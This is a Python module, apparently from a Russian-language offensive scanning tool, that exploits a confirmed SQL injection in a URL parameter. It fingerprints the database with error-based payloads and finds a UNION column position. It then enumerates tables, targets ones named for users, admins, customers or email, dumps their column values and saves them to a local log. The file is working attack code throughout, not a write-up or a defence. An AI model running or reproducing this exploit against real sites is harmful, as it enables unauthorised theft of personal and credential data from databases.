# -*- coding: utf-8 -*-
"""Разработка подтверждённой инъекции. Только чтение, с потолком по времени."""
import os
import re
import time
import urllib.parse

from core import config, findings, http, ui
from modules.sqli import ERR

MARK = tuple("zq%d" % i for i in range(1, 16))
MAXLEN = 4000
INTEREST = ("user", "users", "admin", "customer", "order", "email", "lead", "client", "member")


def _mk(url, param, value):
    head, _, qs = url.partition("?")
    parts = []
    for pair in qs.split("&"):
        k, _, v = pair.partition("=")
        parts.append("%s=%s" % (k, urllib.parse.quote(value) if k == param else v))
    return head + "?" + "&".join(parts)


def _parse(f):
    url = f.get("url") or ""
    head, _, qs = url.partition("?")
    for pair in qs.split("&"):
        k, _, v = pair.partition("=")
        v = urllib.parse.unquote(v)
        if v.endswith("'"):
            return url, k, v[:-1]
    return "", "", ""


def _get(host, url, timeout=20):
    try:
        return http.get(host, url, referer="https://" + host + "/", timeout=timeout)
    except Exception:
        return None


def _err(r):
    low = (r.text or "").lower()
    for m in ERR:
        if m in low:
            return True
    return False


def _my_scalar(host, url, param, base, expr):
    p = base + "' AND extractvalue(1,concat(0x7e,(%s),0x7e))-- -" % expr
    r = _get(host, _mk(url, param, p))
    if r is None:
        return ""
    m = re.search(r"~([^~]{1,1200})~", r.text or "")
    return m.group(1).strip() if m else ""


def _pg_scalar(host, url, param, base, expr):
    p = base + "' AND 1=CAST((%s) AS int)-- -" % expr
    r = _get(host, _mk(url, param, p))
    if r is None:
        return ""
    m = re.search(r'integer:\s*"([^"]{1,1200})"', r.text or "")
    return m.group(1).strip() if m else ""


def _dbms(host, url, param, base):
    v = _my_scalar(host, url, param, base, "version()")
    if v:
        return "mysql", v
    v = _pg_scalar(host, url, param, base, "version()")
    if v:
        return "pg", v
    return "", ""


def _columns(host, url, param, base, stop):
    ok = 0
    for n in range(1, 16):
        if stop():
            break
        r = _get(host, _mk(url, param, "%s' ORDER BY %d-- -" % (base, n)))
        if r is None:
            break
        if _err(r):
            return ok
        ok = n
    return ok


def _union(host, url, param, base, cols):
    payload = base + "' UNION SELECT " + ",".join(MARK[i] for i in range(cols)) + "-- -"
    r = _get(host, _mk(url, param, payload))
    if r is None:
        return -1
    body = r.text or ""
    for i in range(cols):
        if MARK[i] in body:
            return i
    return -1


def _via_union(host, url, param, base, cols, pos, expr):
    parts = list(MARK[:cols])
    parts[pos] = "concat(0x7e,(%s),0x7e)" % expr
    payload = base + "' UNION SELECT " + ",".join(parts) + "-- -"
    r = _get(host, _mk(url, param, payload))
    if r is None:
        return ""
    m = re.search(r"~([^~]{1,1200})~", r.text or "")
    return m.group(1).strip() if m else ""


def run(host, items, full=False, budget=120):
    out = []
    lines = []
    t0 = time.time()

    def stop():
        return time.time() - t0 > budget

    def note(tag, text):
        text = str(text)[:MAXLEN]
        lines.append("%s\t%s" % (tag, text))
        ui.ok("%s: %s" % (tag, text[:110]))
        out.append(findings.make(host, tag_url, "extract:" + tag, 0, len(text), 0, text, "", tag))

    for f in items[:3]:
        if stop():
            break
        url, param, base = _parse(f)
        if not url:
            continue
        tag_url = f.get("url", "")
        ui.head("РАЗРАБОТКА  ->  " + param)

        dbms, ver = _dbms(host, url, param, base)
        if not dbms:
            ui.say("канал вывода не открылся")
            continue
        note("субд", "%s %s" % (dbms, ver))
        if stop():
            break

        cols = _columns(host, url, param, base, stop)
        note("колонки", cols or "не определены")
        pos = _union(host, url, param, base, cols) if cols and not stop() else -1
        if pos >= 0:
            note("union", "позиция %d" % (pos + 1))

        def val(expr):
            if stop():
                return ""
            if pos >= 0:
                return _via_union(host, url, param, base, cols, pos, expr)
            return _my_scalar(host, url, param, base, expr) if dbms == "mysql" \
                else _pg_scalar(host, url, param, base, expr)

        for tag, expr in (("база", "database()"), ("польз", "user()")):
            v = val(expr)
            if v:
                note(tag, v)

        if not full or stop():
            continue

        if dbms == "mysql":
            tb = val("(SELECT group_concat(table_name) FROM information_schema.tables "
                     "WHERE table_schema=database())")
        else:
            tb = val("(SELECT string_agg(tablename, ',') FROM pg_tables "
                     "WHERE schemaname='public')")
        if not tb:
            ui.say("таблицы не отдались")
            continue
        note("таблицы", tb)

        tables = [t for t in tb.replace("\n", ",").split(",") if t.strip()]
        pick = [t for t in tables if any(k in t.lower() for k in INTEREST)][:3] or tables[:2]
        for t in pick:
            if stop():
                break
            t = t.strip()
            if dbms == "mysql":
                cl = val("(SELECT group_concat(column_name) FROM information_schema.columns "
                         "WHERE table_schema=database() AND table_name='%s')" % t)
            else:
                cl = val("(SELECT string_agg(column_name, ',') FROM information_schema.columns "
                         "WHERE table_name='%s')" % t)
            note("колонки " + t, cl or "нет")
            cols_l = [c for c in (cl or "").replace("\n", ",").split(",") if c.strip()][:6]
            if not cols_l:
                continue
            expr = "(SELECT group_concat(%s SEPARATOR ' || ') FROM %s)" % (
                ", ':', ".join(c.strip() for c in cols_l), t)
            if dbms == "pg":
                expr = "(SELECT string_agg(concat_ws(':', %s), ' || ') FROM %s)" % (
                    ", ".join(c.strip() for c in cols_l), t)
            note("данные " + t, val(expr) or "нет")

    if lines:
        os.makedirs(config.LOGS, exist_ok=True)
        p = os.path.join(config.LOGS, host + "_extract.txt")
        with open(p, "a", encoding="utf-8") as f:
            f.write("=== %s %s\n" % (time.strftime("%Y-%m-%d %H:%M"), host))
            for l in lines:
                f.write(l + "\n")
        ui.say("файл: " + p)
    if not out:
        ui.say("разработка: пусто")
    return out
